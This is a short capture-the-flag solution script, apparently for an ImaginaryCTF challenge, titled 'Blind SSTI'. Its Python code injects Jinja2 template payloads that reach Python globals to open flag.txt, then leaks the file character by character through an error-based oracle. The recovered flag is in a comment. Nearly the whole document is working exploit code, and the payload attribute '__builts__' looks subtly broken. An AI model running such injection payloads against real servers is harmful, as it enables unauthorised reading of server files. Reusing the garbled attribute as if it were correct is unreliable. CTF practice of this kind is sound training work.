Blind SSTI
```
import requests, string, time
arr =  '_' + string.printable

url = """http://puzzler7.imaginaryctf.org:5555/ssti?input={{%s}}"""
s = requests.session()

def blind(step):
    d = 0
    for char in arr:
        payload = f"""1 if lipsum.__globals__.__builts__.open('flag.txt','r').read()[{step}]=='''{char}''' else 1/0"""
        if s.get(url%payload).status_code==200:
            return char
        d += 1
        if d==4:
            d = 0
            time.sleep(1)   
    return None

def FLAG():

    f = ''  # ictf{I_really_hope_that_this_doesnt_k1ll_my_server}
    step = 0
    while 1:
        char = blind(step)
        if char == None:
            return f
        step += 1    
        f += char
        print('flag = ',f)  
print(FLAG())
```
